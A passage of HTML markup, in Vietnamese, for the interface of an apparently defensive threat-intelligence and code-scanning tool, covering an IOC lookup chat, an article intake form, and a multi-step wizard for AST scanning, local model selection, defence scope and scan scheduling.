        <span id="st3"></span><span id="st3Meta"></span>
        <span id="st4"></span><span id="st4Meta"></span>
      </div>
    </div>

    <!-- KHUNG CHAT TRỰC TIẾP VỚI LOCAL AI AGENT -->
    <section class="CyberBox" id="sec-chat" style="display:none; max-width:820px; margin:0 auto 26px;">
      <div id="wizardBoxLegend" class="BoxLegend" id="chatBoxLegend">TRỢ LÝ AI AGENT (ĐANG TẢI PHẦN CỨNG)</div>

      <div id="chatLogBox" style="background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px; height:320px; overflow-y:auto; padding:14px 16px; margin-bottom:14px; display:flex; flex-direction:column; gap:12px; font-size:13.5px;">
        <div style="padding:10px 14px; border-left:3px solid var(--primary); background:#ffffff; border-radius:0 6px 6px 0; border:1px solid var(--border-main); border-left:3px solid var(--primary);">
          <b style="color:var(--primary);">OpenClaw-AI:</b><br/>
          Hệ thống AI Agent hỗ trợ tiếng Việt có dấu Unikey. Nhập chỉ số IOC (IP, Domain, CVE) vào khung bên dưới để tự động tra cứu dữ liệu từ 5 nguồn tình báo (OTX, Abuse.ch/VT, AbuseIPDB, Shodan, GreyNoise).
        </div>
      </div>

      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
        <label class="FieldLabel" style="margin:0;">NHẬP CÂU HỎI HOẶC CHỈ SỐ IOC CẦN ĐIỀU TRA</label>
        <div style="display:flex; gap:6px; flex-wrap:wrap;">
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Kiểm tra mức độ nguy hiểm của IP 43.134.165.205')">Tra cứu IP 43.134.165.205</button>
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Liệt kê các lỗ hổng CVE nguy hiểm nhất trong kho bài báo')">Top CVE nguy hiểm</button>
          <button type="button" class="BtnMiniProof" onclick="quickFillChat('Đề xuất chính sách phòng thủ WAF và Suricata cho lỗ hổng RCE')">Quy tắc phòng thủ RCE</button>
        </div>
      </div>
      <div style="display:flex; gap:10px;">
        <input
          type="text"
          id="webChatInput"
          class="CleanInput"
          style="flex:1;"
          placeholder="VD: Kiểm tra mức độ nguy hiểm của IP 43.134.165.205 và đề xuất chính sách phòng thủ..."
          onkeydown="if(event.key==='Enter') sendWebChatMessage()"
        />
        <button class="CleanBtn btn-primary" id="btnSendChat" onclick="sendWebChatMessage()">
          Gửi Câu Hỏi
        </button>
      </div>
    </section>

    <!-- KHUNG THÊM BÁO MỚI -->
    <section class="CyberBox" id="sec-add" style="display:none; max-width:700px; margin:0 auto 26px;">
      <div class="BoxLegend">THÊM BÀI BÁO MỚI</div>

      <div style="margin-bottom:14px;">
        <label class="FieldLabel">URL BÀI BÁO CẦN THU THẬP NGUYÊN BẢN</label>
        <div style="display:flex; gap:10px;">
          <input
            type="text"
            id="newArticleUrlInput"
            class="CleanInput"
            style="flex:1;"
            placeholder="https://thehackernews.com/... hoặc https://securelist.com/..."
          />
          <button class="CleanBtn btn-primary" id="btnAddUrl" onclick="addArticleFromUrl()">
            Cào Dữ Liệu URL
          </button>
        </div>
      </div>

      <div id="manualArticleDrawer" style="margin-top:16px; padding-top:16px; border-top:1px solid var(--border-main);">
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:10px;">
          <div>
            <label class="FieldLabel">TIÊU ĐỀ BÀI BÁO (TÙY CHỌN)</label>
            <input type="text" id="manualTitleInput" class="CleanInput" style="width:100%;" placeholder="Nhập tiêu đề..." />
          </div>
          <div>
            <label class="FieldLabel">WEBSITE NGUỒN</label>
            <input type="text" id="manualSourceUrlInput" class="CleanInput" style="width:100%;" placeholder="https://thehackernews.com" />
          </div>
        </div>
        <label class="FieldLabel">NỘI DUNG VĂN BẢN</label>
        <textarea
          id="manualContentInput"
          class="CleanInput"
          style="width:100%; min-height:110px; margin-bottom:12px;"
          placeholder="Dán nội dung báo cáo kỹ thuật vào đây..."
        ></textarea>
        <button class="CleanBtn btn-primary" style="width:100%;" onclick="addManualArticle()">
          Lưu và Phân Tích
        </button>
      </div>
    </section>

    <!-- MỤC 1: BÀI BÁO & HIGHLIGHT IOC -->
    
    <!-- ============================================================== -->
    <!-- MỤC 0: WIZARD QUY TRÌNH PHÒNG THỦ TỰ HÀNH 5 BƯỚC              -->
    <!-- ============================================================== -->
    <section class="CyberBox" id="sec-wizard" style="margin-bottom:24px; border:2px solid #3b82f6; background:#ffffff; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
      <div id="wizardBoxLegend" class="BoxLegend" style="background:#2563eb; color:#ffffff; font-weight:700; padding:4px 14px; border-radius:4px; font-size:12px; letter-spacing:0.04em;">
        WIZARD QUY TRÌNH PHÒNG THỦ TÁC TỬ TỰ HÀNH (6 BƯỚC KHÉP KÍN)
      </div>

      <!-- Stepper Nav Bar (6 Bước mạch lạc) -->
      <div id="wizardStepperNav" style="display:flex; justify-content:space-between; align-items:center; margin:16px 0 24px 0; background:#f8fafc; padding:12px 18px; border-radius:8px; border:1px solid #e2e8f0; flex-wrap:wrap; gap:8px;">
        <div id="stepBadge1" class="WizardStepBadge active" style="font-weight:700; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#2563eb; color:#ffffff;">
          1. Quét AST & Điểm Nóng
        </div>
        <span style="color:#94a3b8; font-weight:bold;">&rarr;</span>
        <div id="stepBadge2" class="WizardStepBadge" style="font-weight:600; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#e2e8f0; color:#475569;">
          2. Chọn Model AI
        </div>
        <span style="color:#94a3b8; font-weight:bold;">&rarr;</span>
        <div id="stepBadge3" class="WizardStepBadge" style="font-weight:600; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#e2e8f0; color:#475569;">
          3. Chọn Scope Phòng Thủ
        </div>
        <span style="color:#94a3b8; font-weight:bold;">&rarr;</span>
        <div id="stepBadge4" class="WizardStepBadge" style="font-weight:600; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#e2e8f0; color:#475569;">
          4. Thiết Lập Thời Gian
        </div>
        <span style="color:#94a3b8; font-weight:bold;">&rarr;</span>
        <div id="stepBadge5" class="WizardStepBadge" style="font-weight:600; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#e2e8f0; color:#475569;">
          5. Cào Báo & Sinh Kỹ Năng
        </div>
        <span style="color:#94a3b8; font-weight:bold;">&rarr;</span>
        <div id="stepBadge6" class="WizardStepBadge" style="font-weight:600; padding:6px 12px; border-radius:20px; font-size:11.5px; background:#e2e8f0; color:#475569;">
          6. Vá & Kiểm Thử
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 0: MÀN HÌNH KHỞI ĐẦU TỐI GIẢN (NÚT HÌNH TRÒN CHÍNH GIỮA) -->
      <!-- ============================================================== -->
      <div id="wizardCard0" class="WizardCard" style="display:block; text-align:center; padding:30px 15px;">
        <div style="max-width:720px; margin:0 auto; background:#ffffff; border:1px solid #e2e8f0; border-radius:12px; padding:32px 24px; box-shadow:0 4px 20px rgba(0,0,0,0.04);">
          
          <div style="font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:1px; color:#2563eb; margin-bottom:6px;">
            HỆ THỐNG AN NINH MẠNG TỰ HÀNH CTI AGENTIC DEFENSE
          </div>
          
          <h2 style="font-size:22px; font-weight:800; color:#0f172a; margin-bottom:12px;">
            Thiết Lập Phòng Thủ Ngữ Cảnh Dự Án
          </h2>

          <!-- Thẻ tóm tắt dự án & phần cứng -->
          <div style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:8px; padding:12px 18px; margin-bottom:28px; display:inline-flex; align-items:center; gap:16px; flex-wrap:wrap; justify-content:center; font-size:13px; color:#334155;">
            <div>
              Dự án mục tiêu: <b id="landingTargetName" style="color:#0f172a;">-</b>
              <span id="landingTargetPath" style="font-family:monospace; color:#64748b; font-size:11.5px; margin-left:4px;">(-)</span>
            </div>
            <div style="color:#cbd5e1;">|</div>
            <div>
              Phần cứng: <b id="landingHardwareSummary" style="color:#2563eb;">AMD Radeon RX 6600 (8GB VRAM) • Chờ khảo sát &amp; chọn model tại Bước 2</b>
            </div>
          </div>

          <!-- NÚT HÌNH TRÒN TO CHÍNH GIỮA (CIRCULAR SCAN BUTTON) -->
          <div style="display:flex; justify-content:center; align-items:center; margin:15px 0 25px 0;">
            <button type="button" id="btnLandingCircularScan" onclick="startLandingScan()" style="
              width: 195px;
              height: 195px;
              border-radius: 50%;
              background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
              border: 5px solid #bfdbfe;
              color: #ffffff;
              cursor: pointer;
              box-shadow: 0 12px 32px rgba(37, 99, 235, 0.35);
              transition: all 0.25s ease-in-out;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              outline: none;
            " onmouseover="this.style.transform='scale(1.06)'; this.style.boxShadow='0 18px 40px rgba(37,99,235,0.45)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 12px 32px rgba(37,99,235,0.35)';">
              <span style="font-size:13px; font-weight:700; letter-spacing:1px; opacity:0.9; text-transform:uppercase;">BẮT ĐẦU</span>
              <span style="font-size:21px; font-weight:900; letter-spacing:1.5px; margin-top:2px; text-transform:uppercase;">QUÉT DỰ ÁN</span>
              <span style="font-size:11px; opacity:0.8; margin-top:4px;">(Click để phân tích AST)</span>
            </button>
          </div>

          <p style="font-size:12.5px; color:#64748b; margin:0; line-height:1.6;">
            Nhấn vào nút tròn để Tác tử AI đọc cây cú pháp AST, định vị điểm nhạy cảm và bắt đầu quy trình phòng thủ tự hành 6 bước.
          </p>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 1: QUÉT SÂU AST & ĐỊNH DANH DỰ ÁN                         -->
      <!-- ============================================================== -->
      <div id="wizardCard1" class="WizardCard" style="display:block;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 1: Quét Sâu Cây AST Mã Nguồn &amp; Định Danh Kiến Trúc Dự Án</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Tác tử AI Codebase Inspector sẽ duyệt cây thư mục, đọc cú pháp AST để nhận diện ngôn ngữ, framework, phiên bản môi trường và bóc tách các điểm nóng nhạy cảm.
        </p>

        <!-- Thẻ dự án hiện tại -->
        <div style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:8px; padding:16px; margin-bottom:16px;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
            <div>
              <span style="font-size:11px; font-weight:700; color:#2563eb; background:#eff6ff; border:1px solid #bfdbfe; padding:2px 8px; border-radius:4px;">
                DỰ ÁN MỤC TIÊU
              </span>
              <span id="step1TargetName" style="font-size:15px; font-weight:700; color:#0f172a; margin-left:8px;">My_Website</span>
            </div>
            <div style="font-size:11.5px; color:#64748b;">
              <a href="javascript:void(0)" onclick="toggleStep1AdvancedOptions()" id="toggleStep1OptLink" style="color:#2563eb; font-weight:600; text-decoration:none;">
                [+] Tùy chọn nâng cao: Đổi thư mục hoặc dán link Git
              </a>
            </div>
          </div>

          <div style="font-family:monospace; font-size:12.5px; color:#334155; background:#ffffff; border:1px solid #e2e8f0; padding:8px 12px; border-radius:4px; word-break:break-all;">
            <span style="color:#64748b;">Đường dẫn:</span> <span id="step1TargetPath">./target_projects/My_Website</span>
          </div>

          <!-- Drawer tùy chọn nâng cao -->
          <div id="step1AdvancedDrawer" style="display:none; margin-top:14px; padding-top:14px; border-top:1px dashed #cbd5e1;">
            <label class="FieldLabel" style="font-size:12px; font-weight:700; color:#1e293b; margin-bottom:6px; display:block;">
              THAY ĐỔI ĐƯỜNG DẪN THƯ MỤC TRÊN MÁY TÍNH:
            </label>
            <div style="display:flex; gap:8px; margin-bottom:10px; flex-wrap:wrap;">
              <input type="text" id="wizardInputTarget" class="CleanInput" style="flex:1; min-width:280px; font-family:monospace; padding:8px 12px; font-size:13px; border:1px solid #cbd5e1; border-radius:6px;" value="./target_projects/My_Website" oninput="debounceValidateFolder()" />
              <button type="button" id="btnBrowseNativeFolder" class="CleanBtn" style="background:#2563eb; color:#ffffff; font-weight:700; padding:8px 14px; border-radius:6px; border:none; cursor:pointer;" onclick="triggerBrowseNativeFolder()">
                Duyệt File Explorer...
              </button>
              <button type="button" class="CleanBtn" style="background:#ffffff; color:#475569; font-weight:600; padding:8px 12px; border-radius:6px; border:1px solid #cbd5e1; cursor:pointer;" onclick="openDirectoryBrowserModal()">
                Duyệt Cây Thư Mục
              </button>
            </div>
            <div style="margin-bottom:10px;">
              <label class="FieldLabel" style="font-size:12px; font-weight:600; color:#475569; margin-bottom:4px; display:block;">HOẶC NHẬP LINK GITHUB (TỰ ĐỘNG CLONE):</label>
              <input type="text" id="wizardInputClone" class="CleanInput" style="width:100%; font-family:monospace; padding:8px 12px; border:1px solid #cbd5e1; border-radius:6px;" placeholder="https://github.com/username/vulnerable-web-app.git" />
            </div>
            <div style="display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
              <span style="font-size:11.5px; color:#64748b; font-weight:700;">CHỌN NHANH:</span>
              <button type="button" class="CleanBtn" style="font-size:11.5px; padding:3px 8px; background:#eff6ff; color:#1d4ed8; border:1px solid #bfdbfe; font-weight:600; border-radius:4px; cursor:pointer;" onclick="setWizardTarget('./target_projects/My_Website')">My_Website (PHP)</button>
              <button type="button" class="CleanBtn" style="font-size:11.5px; padding:3px 8px; background:#fef2f2; color:#b91c1c; border:1px solid #fecaca; font-weight:600; border-radius:4px; cursor:pointer;" onclick="setWizardTarget('./target_projects/demo_vulnerable_php_app')">Demo PHP Lỗi (RCE)</button>
              <button type="button" class="CleanBtn" style="font-size:11.5px; padding:3px 8px; background:#f8fafc; color:#334155; border:1px solid #cbd5e1; font-weight:600; border-radius:4px; cursor:pointer;" onclick="setWizardTarget('.')">Đồ Án Hiện Tại</button>
            </div>
          </div>
        </div>

        <!-- Nút Bắt đầu quét -->
        <div style="text-align:center; margin:18px 0 16px;">
          <button type="button" id="btnRunStep1" class="CleanBtn btn-primary" style="padding:14px 44px; font-size:16px; font-weight:700; background:#2563eb; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 6px 16px rgba(37,99,235,0.25); transition:all 0.2s;" onclick="wizardExecuteStep1()">
            [ BẮT ĐẦU QUÉT DỰ ÁN ]
          </button>
          <div style="margin-top:8px; font-size:12.5px; color:#64748b;">
            Nhấn để Tác tử AI đọc cây cú pháp AST và tự động phát hiện các điểm nóng trong mã nguồn.
          </div>
        </div>

        
        <!-- THANH TIẾN ĐỘ THỜI GIAN THỰC (REAL-TIME SCAN PROGRESS BAR) -->
        <div id="wzScanProgressWrap" style="display:none; margin:16px 0 14px; background:#f8fafc; border:1.5px solid #cbd5e1; border-radius:8px; padding:14px 18px; box-shadow:0 2px 8px rgba(0,0,0,0.04);">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; font-size:12.5px;">
            <div style="font-weight:700; color:#0f172a; display:flex; align-items:center; gap:8px;">
              <span id="wzProgressSpinner" style="display:inline-block; width:13px; height:13px; border:2.5px solid #2563eb; border-top-color:transparent; border-radius:50%; animation:spinSlow 0.8s linear infinite;"></span>
              <span id="wzProgressStageText">Khởi tạo phân tích mã nguồn...</span>
            </div>
            <div style="font-weight:800; color:#2563eb; font-family:monospace; font-size:14px;" id="wzProgressPercent">0%</div>
          </div>
          <div style="background:#e2e8f0; border-radius:6px; height:10px; overflow:hidden; position:relative;">
            <div id="wzProgressBarFill" style="background:linear-gradient(90deg, #3b82f6, #2563eb, #1d4ed8); width:0%; height:100%; transition:width 0.25s ease; border-radius:6px;"></div>
          </div>
          <div style="display:flex; justify-content:space-between; font-size:11.5px; color:#64748b; margin-top:6px;">
            <span id="wzProgressDetail">Tác tử AI đang duyệt cây AST &amp; gọi Local LLM (GPU RX 6600)</span>
            <span id="wzProgressEta" style="font-weight:600; color:#2563eb;">Ước tính: ~15s</span>
          </div>
        </div>

        <!-- Live Streaming Terminal -->
        <div id="wzScanAgentTerminal" style="display:none; background:#0f172a; color:#38bdf8; font-family:monospace; font-size:12px; padding:14px; border-radius:6px; min-height:140px; max-height:200px; overflow-y:auto; border:1px solid #1e293b; line-height:1.7; margin-bottom:16px;">
          <div style="color:#94a3b8;">[KHỞI TẠO] Sẵn sàng kích hoạt Tác tử AI Codebase Inspector...</div>
        </div>

        <!-- Khung Kết quả & Điểm mấu chốt (Hiện ra sau khi quét xong) -->
        <div id="wzScanResultSummary" style="display:none; background:#f8fafc; border:1.5px solid #3b82f6; border-radius:8px; padding:16px; margin-bottom:18px;">
          <div style="font-size:13px; font-weight:700; color:#1e40af; margin-bottom:10px; border-bottom:1px solid #e2e8f0; padding-bottom:6px;">
            KẾT QUẢ ĐỊNH DANH MÃ NGUỒN &amp; ĐIỂM MẤU CHỐT CỦA DỰ ÁN
          </div>
          
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:10px;">
            <div>
              <b style="color:#334155; font-size:12.5px;">Ngôn ngữ lập trình chính:</b>
              <div id="wzLanguagesBadge" style="display:inline-flex; gap:6px; flex-wrap:wrap; margin-left:8px;">-</div>
            </div>
            <div>
              <b style="color:#334155; font-size:12.5px;">Frameworks &amp; Công nghệ:</b>
              <div id="wzTechsBadge" style="display:inline-flex; gap:6px; flex-wrap:wrap; margin-left:8px;">-</div>
            </div>
          </div>

          <div style="margin-bottom:10px;">
            <b style="color:#334155; font-size:12.5px;">Phiên bản Runtime môi trường:</b>
            <div id="wzRuntimeBadge" style="display:inline-flex; gap:6px; flex-wrap:wrap; margin-left:8px;">-</div>
          </div>

          <!-- Sensitive Sinks Box -->
          <div style="border-top:1px dashed #cbd5e1; padding-top:10px; margin-bottom:12px;">
            <b style="color:#b91c1c; font-size:12.5px;">Các điểm gọi hàm nhạy cảm AST định vị được (Sensitive Sinks: exec, eval, system):</b>
            <div id="wzSinksBox" style="font-family:monospace; font-size:11.5px; color:#334155; background:#ffffff; padding:8px 12px; border:1px solid #e2e8f0; border-radius:4px; max-height:100px; overflow-y:auto; margin-top:6px;">
              -
            </div>
          </div>

          <!-- Kết luận tác tử AI -->
          <div style="background:#eff6ff; border:1px solid #bfdbfe; border-radius:6px; padding:12px; font-size:13px; color:#1e3a8a; line-height:1.6;">
            <b>KẾT LUẬN CỦA TÁC TỬ AI:</b>
            <span id="wzVerdictText">Dự án được xác định là Ứng dụng Web Đa Tầng (Full-Stack Web). Đã tự động gán phân hệ khuyến nghị: Scope A: Web &amp; API Layer.</span>
          </div>
        </div>

        <!-- Nút Tiếp Tục (Khi chưa quét: TỐI MÀU; Khi quét xong: SÁNG MÀU LÊN) -->
        <div style="display:flex; justify-content:flex-end; margin-top:14px;">
          <button type="button" id="btnNextFromStep1" class="CleanBtn" style="padding:12px 28px; font-size:14px; font-weight:700; background:#94a3b8; color:#ffffff; border:none; border-radius:6px; cursor:not-allowed; opacity:0.5; transition:all 0.3s;" onclick="if(this.dataset.enabled==='true') wizardGotoStep(2);" disabled title="Hãy nhấn [ BẮT ĐẦU QUÉT DỰ ÁN ] trước để mở khóa bước tiếp theo">
            [ TIẾP TỤC: CHỌN MÔ HÌNH AI (BƯỚC 2) &rarr; ]
          </button>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 2: CHỌN MÔ HÌNH AI THÍCH ỨNG CẤU HÌNH PHẦN CỨNG          -->
      <!-- ============================================================== -->
      <div id="wizardCard2" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 2: Chọn Mô Hình AI Thích Ứng Cấu Hình Phần Cứng (Hardware-Aware Model Selection)</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Hệ thống tự động phát hiện năng lực CPU, GPU, VRAM và <b>chọn sẵn mô hình mạnh nhất</b> mà máy tính của bạn có thể vận hành trơn tru. Bạn có thể giữ nguyên mặc định hoặc nhấp chọn mô hình khác tùy ý:
        </p>

        <!-- Thẻ thông số phần cứng -->
        <div style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:8px; padding:14px 18px; margin-bottom:18px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
          <div style="font-size:12.5px; color:#334155; line-height:1.7;">
            <div><b>Card Đồ Họa (GPU):</b> <span id="wzGpuText" style="color:#0f172a; font-weight:600;">AMD Radeon RX 6600 (8.0GB VRAM)</span></div>
            <div><b>Bộ Vi Xử Lý (CPU):</b> <span id="wzCpuText" style="color:#0f172a; font-weight:600;">13th Gen Intel Core i5-13400F</span> &bull; <b>RAM:</b> <span id="wzRamText" style="color:#0f172a; font-weight:600;">15.8 GB</span></div>
          </div>
          <div id="wzHardwareSummaryTag" style="font-size:12px; font-weight:700; color:#15803d; background:#dcfce7; border:1px solid #86efac; padding:4px 12px; border-radius:6px;">
            CẤU HÌNH ĐỒ HỌA TIÊU CHUẨN
          </div>
        </div>

        <!-- Dynamic Container for Model Tiers -->
        <div id="wzModelTiersContainer" style="display:flex; flex-direction:column; gap:10px; margin-bottom:20px;">
          <!-- Populated dynamically by renderHardwareModelSelector() -->
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
          <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #cbd5e1; background:#ffffff; color:#334155; border-radius:6px; cursor:pointer;" onclick="wizardGotoStep(1)">
            &larr; Quay Lại Bước 1
          </button>
          <button type="button" class="CleanBtn btn-primary" style="padding:12px 28px; font-weight:700; background:#2563eb; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.3);" onclick="wizardConfirmStep2ModelAndProceed()">
            [ XÁC NHẬN MODEL NÀY &amp; TIẾP TỤC BƯỚC 3 &rarr; ]
          </button>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 3: CHỌN PHÂN HỆ BẢO VỆ (SCOPE SELECTION - DẠNG TICK NHIỀU) -->
      <!-- ============================================================== -->
      <div id="wizardCard3" class="WizardCard" style="display:none;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; flex-wrap:wrap; gap:8px;">
          <h3 style="font-size:16px; margin:0; color:#0f172a;">Bước 3: Chọn Phân Hệ Bảo Vệ Mối Đe Dọa (CTI Threat Scope)</h3>
          <label style="display:inline-flex; align-items:center; gap:8px; font-size:12.5px; font-weight:700; color:#2563eb; cursor:pointer; background:#eff6ff; border:1.5px solid #bfdbfe; padding:5px 14px; border-radius:6px; transition:all 0.2s;" onmouseover="this.style.background='#dbeafe'" onmouseout="this.style.background='#eff6ff'">
            <input type="checkbox" id="chkSelectAllScopes" onchange="toggleSelectAllScopes(this.checked)" style="width:16px; height:16px; cursor:pointer; accent-color:#2563eb;" />
            CHỌN TẤT CẢ PHÂN HỆ (TOÀN DIỆN)
          </label>
        </div>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Tác tử AI đã đối chiếu mã nguồn và <b>tự động tick chọn phân hệ khuyến nghị</b> cho dự án của bạn. Bạn có thể <b>tick chọn nhiều phân hệ cùng lúc</b> để mở rộng phạm vi lá chắn bảo vệ:
        </p>

        <!-- Danh sách Phân hệ Scope dạng Tick (Checkboxes) -->
        <div id="scopeSelectionList" style="display:flex; flex-direction:column; gap:10px; margin-bottom:20px;">
          
          <!-- Scope A: Web -->
          <label id="scopeCard_SCOPE_WEB" style="display:flex; align-items:flex-start; gap:12px; padding:14px 18px; border-radius:8px; background:#eff6ff; border:2px solid #2563eb; cursor:pointer; transition:all 0.2s;">
            <input type="checkbox" name="wzScopeCheckbox" value="SCOPE_WEB" checked onchange="onWizardScopeCheckboxChange()" style="margin-top:4px; width:17px; height:17px; cursor:pointer; accent-color:#2563eb;" />
            <div style="flex:1;">
              <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:4px;">
                <b style="color:#0f172a; font-size:14px;">Scope A: Phân Hệ Ứng Dụng Web &amp; API Layer</b>
                <span id="scopeWebRecBadge" style="background:#dcfce7; color:#15803d; font-size:11px; font-weight:700; padding:2px 8px; border-radius:4px;">[KHUYẾN NGHỊ TÁC TỬ]</span>
                <span id="scopeWebSelectedBadge" style="background:#2563eb; color:#ffffff; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:4px;">ĐÃ CHỌN</span>
              </div>
              <div style="font-size:12.5px; color:#475569; line-height:1.5;">
                Dành cho các ứng dụng Web (PHP, Node.js, Python, Java). Trọng tâm phòng thủ: SQL Injection, RCE, Webshell, Path Traversal, SSRF, XSS và các lỗ hổng web nóng.
              </div>
            </div>
          </label>

          <!-- Scope B: Network -->
          <label id="scopeCard_SCOPE_NETWORK" style="display:flex; align-items:flex-start; gap:12px; padding:14px 18px; border-radius:8px; background:#ffffff; border:1px solid #cbd5e1; cursor:pointer; transition:all 0.2s;">
            <input type="checkbox" name="wzScopeCheckbox" value="SCOPE_NETWORK" onchange="onWizardScopeCheckboxChange()" style="margin-top:4px; width:17px; height:17px; cursor:pointer; accent-color:#2563eb;" />
            <div style="flex:1;">
              <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:4px;">
                <b style="color:#0f172a; font-size:14px;">Scope B: Phân Hệ Hạ Tầng Mạng &amp; Vành Đai C2</b>
                <span id="scopeNetSelectedBadge" style="display:none; background:#2563eb; color:#ffffff; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:4px;">ĐÃ CHỌN</span>
              </div>
              <div style="font-size:12.5px; color:#475569; line-height:1.5;">
                Dành cho hạ tầng mạng, Docker, Nginx, VPN, Gateway và tường lửa biên. Trọng tâm: Botnet Mirai, C2 churn rate, DDoS, quét cổng và brute-force.
              </div>
            </div>
          </label>

          <!-- Scope C: Endpoint -->
          <label id="scopeCard_SCOPE_ENDPOINT" style="display:flex; align-items:flex-start; gap:12px; padding:14px 18px; border-radius:8px; background:#ffffff; border:1px solid #cbd5e1; cursor:pointer; transition:all 0.2s;">
            <input type="checkbox" name="wzScopeCheckbox" value="SCOPE_ENDPOINT" onchange="onWizardScopeCheckboxChange()" style="margin-top:4px; width:17px; height:17px; cursor:pointer; accent-color:#2563eb;" />
            <div style="flex:1;">
              <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:4px;">
                <b style="color:#0f172a; font-size:14px;">Scope C: Phân Hệ Máy Chủ &amp; Thiết Bị Đầu Cuối (Host Identity)</b>
                <span id="scopeEndSelectedBadge" style="display:none; background:#2563eb; color:#ffffff; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:4px;">ĐÃ CHỌN</span>
              </div>
              <div style="font-size:12.5px; color:#475569; line-height:1.5;">
                Dành cho ứng dụng Desktop, Active Directory, máy chủ nội bộ. Trọng tâm: Ransomware, leo thang đặc quyền, đánh cắp mật khẩu (Mimikatz), EDR evasion.
              </div>
            </div>
          </label>

          <!-- Scope D: Hardware -->
          <label id="scopeCard_SCOPE_HARDWARE" style="display:flex; align-items:flex-start; gap:12px; padding:14px 18px; border-radius:8px; background:#ffffff; border:1px solid #cbd5e1; cursor:pointer; transition:all 0.2s;">
            <input type="checkbox" name="wzScopeCheckbox" value="SCOPE_HARDWARE" onchange="onWizardScopeCheckboxChange()" style="margin-top:4px; width:17px; height:17px; cursor:pointer; accent-color:#2563eb;" />
            <div style="flex:1;">
              <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:4px;">
                <b style="color:#0f172a; font-size:14px;">Scope D: Phân Hệ Phần Cứng Nhúng, Firmware &amp; Base Layer</b>
                <span id="scopeHwSelectedBadge" style="display:none; background:#2563eb; color:#ffffff; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:4px;">ĐÃ CHỌN</span>
              </div>
              <div style="font-size:12.5px; color:#475569; line-height:1.5;">
                Dành cho thiết bị nhúng, IoT, vi điều khiển, SCADA, BIOS/UEFI. Trọng tâm: Supply chain, lỗ hổng vi mã, can thiệp bộ nhớ phần cứng.
              </div>
            </div>
          </label>

        </div>

        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
          <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #cbd5e1; background:#ffffff; color:#334155; border-radius:6px; cursor:pointer;" onclick="wizardGotoStep(2)">
            &larr; Quay Lại Bước 2
          </button>
          <button type="button" class="CleanBtn btn-primary" style="padding:12px 28px; font-weight:700; background:#2563eb; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.3);" onclick="wizardGotoStep(4)">
            [ TIẾP TỤC: THIẾT LẬP THỜI GIAN (BƯỚC 4) &rarr; ]
          </button>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 4: THIẾT LẬP THỜI GIAN (CADENCE & HISTORY)                -->
      <!-- ============================================================== -->
      <div id="wizardCard4" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 4: Thiết Lập Thời Gian Quét CTI &amp; Mốc Lịch Sử Bài Báo</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Tác tử AI tự động tính toán tần suất quét ngầm và độ sâu bài báo dựa trên đặc tính của Phân hệ đã chọn ở Bước 3:
        </p>

        <!-- 1. Tần suất quét ngầm thích ứng -->
        <div style="background:#eff6ff; border:1px solid #bfdbfe; border-radius:8px; padding:16px; margin-bottom:16px;">
          <div style="font-size:13px; font-weight:700; color:#1e40af; margin-bottom:8px;">
            1. TẦN SUẤT TỰ ĐỘNG QUÉT BÀI BÁO MỚI (BACKGROUND CADENCE)
          </div>
          <div id="wzCadenceAdviceBox" style="font-size:12.5px; color:#1e3a8a; line-height:1.6; margin-bottom:12px;">
